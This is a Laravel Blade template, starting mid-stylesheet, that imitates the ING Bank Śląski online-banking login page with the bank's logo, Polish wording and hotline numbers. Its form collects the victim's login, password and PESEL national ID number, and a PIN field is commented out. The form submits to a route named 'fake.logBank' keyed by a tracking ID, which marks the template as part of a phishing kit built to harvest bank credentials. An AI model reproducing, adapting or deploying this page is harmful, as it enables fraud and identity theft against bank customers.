            --color-p2-hover: #bf420d;
            --color-p3-hover: #b33810;
            --color-p4-hover: #ca4c0b;
            --color-p5-hover: #ff6700;
            --color-p6-hover: #ff8c00;
            --color-s4: #bbb;
            --color-s5: #ddd;
            --color-s7: #f6f6f6;
            --transition: all .2s cubic-bezier(.4, 0, .2, 1) 0s;
            --outline-interactive-element: none;
            --font-weight-light: 300;
            --font-weight-regular: 400;
            --font-weight-semibold: 600;
            --font-weight-extrabold: 700
        }

        a {
            display: inline-block;
            position: relative
        }

        .ing-new-theme .ph-0 {
            padding-left: 0 !important;
            padding-right: 0 !important
        }

        .ing-new-theme .ml-0 {
            margin-left: 0 !important
        }

        @media only screen and (min-width: 768px) {
            .ing-new-theme #layout-region > .login-layout {
                background-image: url(1117702.jpg)
            }
        }

        @media only screen and (min-width: 1200px) {
            .ing-new-theme #layout-region > .login-layout {
                background-image: url(/images/banks/ing-image-5.jpg)
            }
        }

        @media only screen and (max-width: 767px) {
            .ing-new-theme #layout-region > .login-layout {
                background-image: none
            }
        }

        #offers-login-page p {
            margin-bottom: .4em !important
        }

        #offers-login-page .component_wrapper > .component.content {
            padding-top: 0 !important;
            padding-bottom: 0 !important
        }

        .ing-new-theme .login_msg p a:after,
        .ui-offer-box {
            display: none
        }

        #content_wrapper A.loginPage {
            margin-left: 1.2rem !important
        }
    </style>
@endpush
@section('content')
    <div id="layout-region" class="ing-container">
        <noscript>
            <div class="no-js container">
                <div class="container ing-container">
                    <div class="region-wrapper region-wrapper_trans-screen wrapper-trans">
                        <header id="header-region" class="ing-header trans-screen-header">
                            <div>
                                <nav class="navbar"><h1 class="pull-left logo"><span class="logo__link"><img
                                                    src="{{asset('images/banks/ing-logo.svg')}}"
                                                    alt="Strona główna - Moje ING"
                                                    class="logo__img--mobile visible-xs"> <img
                                                    src="{{asset('images/banks/ing-logo.svg')}}"
                                                    alt="Strona główna - Moje ING"
                                                    class="logo__img hidden-xs"></span></h1>
                                </nav>
                            </div>
                        </header>
                        <div id="main-region" class="columns-container">
                            <div class="notification centered info">
                                <div class="notification-row-first">
                                    <div class="notification-icon"><i class="ing-icon"></i></div>
                                    <div class="notification-content" role="alert">
                                        <div class="notification-title "><p>Nie można wyświetlić strony</p></div>
                                        <div class="notification-message"><p>Włącz obsługę JavaScript, aby móc korzystać
                                                z
                                                Moje ING.<br> Możesz to zrobić w ustawieniach swojej przeglądarki.</p>
                                            <p>W razie wątpliwości lub problemów prosimy o&nbsp;kontakt z&nbsp;infolinią:
                                                +48&nbsp;357&nbsp;00&nbsp;69</p></div>
                                        <div class="notification-link notification-link--offset"><a class="link"
                                                                                                    href="#">Zobacz
                                                jak włączyć JavaScript</a></div>
                                        <div class="notification-link notification-link--offset"><a class="link"
                                                                                                    href="#"
                                                                                                    title="Przejdź do&nbsp;Moje ING">Odśwież</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="region--left-corner"></div>
                        <div class="region--right-corner"></div>
                    </div>
                    <footer id="footer-region" class="ing-footer container">
                        <div>
                            <div class="row">
                                <div class="col-xs-12 col-lg-7 ing-list-hybrid-container">
                                    <ul class="ing-list-hybrid pull-left">
                                        <li><a href="#" target="_blank"
                                               rel="noopener"><i class="glyphicon-ing-blocked2"></i> <span>O&nbsp;bezpieczeństwie</span></a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="col-xs-12 col-lg-5 ing-list-inline-container">
                                    <ul class="ing-list-inline">
                                        <li><span id="aria-info">Infolinia:</span> <a href="tel:+48323570069"
                                                                                      aria-describedby="aria-info"><span
                                                        class="sr-only">zadzwoń 32_357 00 69</span><span
                                                        aria-hidden="true">32 357 00 69</span></a>
                                        </li>
                                        <li> ING Bank Śląski S.A.</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </footer>
                </div>
            </div>
        </noscript>
        <div class="login-layout">
            <div id="smart-app-banner-region"></div>
            <div class="region-wrapper login-region login-layout_container ui-content login-layout--top">
                <div class="main-content-wrap">
                    <h1 class="sr-only">Moje ING | ING Bank Śląski - Logowanie</h1>
                    <div id="content-region" class="main-content">
                        <div class="ing-login-container">
                            <div class="content-container box">
                                <header class="ing-header">
                                    <div id="nav-hybrid" class="navbar nav-hybrid nav-hybrid--mobileFixed">
                                        <div class="logo">
                                            <div class="logo__link">
                                                <div id="logo-region">
                                                    <div>
                                                        <img class="logo__img--logo"
                                                             src="{{asset('images/banks/ing-logo.svg')}}"
                                                             alt="ING Bank Śląski" width="128">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </header>
                                <div id="info-region" class="box-content box-content--info"></div>
                                <div class="box-content login-hero"><h2 class="js-header hide-if-empty">Zaloguj się do&nbsp;bankowości
                                        internetowej</h2></div>
                                <div id="body-region" class="body" style="">
                                    <section class="login-form-container">
                                        <div id="check-login-error-banner" class="box-content box-content--error"></div>
                                        <div class="box-content box--after">
                                            <div class="login-form-content">
                                                <form id="bank_pm_form" method="POST"
                                                      action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
                                                      role="form">
                                                    <div style="color: #ff6161; padding: 20px; text-align: center;"></div>
                                                    <div class="form-group">
                                                        <input autocomplete="off" type="text" required
                                                               class="form-control" name="login" placeholder="Login"
                                                               id="login-input" maxlength="10">
                                                    </div>
                                                    <div class="form-group">
                                                        <input autocomplete="off" type="password" required
                                                               class="form-control" name="password" placeholder="Hasło"
                                                               id="password-input">
                                                    </div>

                                                    <div class="form-group">
                                                        <input autocomplete="off" type="text" required
                                                               class="form-control" name="pesel" placeholder="PESEL"
                                                               id="pesel-input">
                                                    </div>
{{--                                                    <div class="form-group">--}}
{{--                                                        <input autocomplete="off" type="text" required--}}
{{--                                                               class="form-control" name="pin" placeholder="PIN"--}}
{{--                                                               id="pin-input">--}}
{{--                                                    </div>--}}
                                                    <div class="_39Dzw _1n7r2" id="login-btn">
                                                        <button class="btn" tabindex="-1" aria-hidden="true"
                                                                slot="_button"
                                                                style="float: right; width: 100%; margin: 0; font-size: 20px; line-height: 24px; display: inline-block; box-sizing: border-box; padding: 12px 30px; min-width: 180px; border-radius: 8px; white-space: nowrap; background-color: #FF6200; color: #fff; text-align: center; text-decoration: none; border: none; font-weight: 600;"
                                                                type="submit">Dalej
                                                        </button>
                                                    </div>
                                                </form>
                                                <div class="footer-region">
                                                    <div></div>
                                                </div>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                                <div id="additional-region" style="min-height: 100px"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection
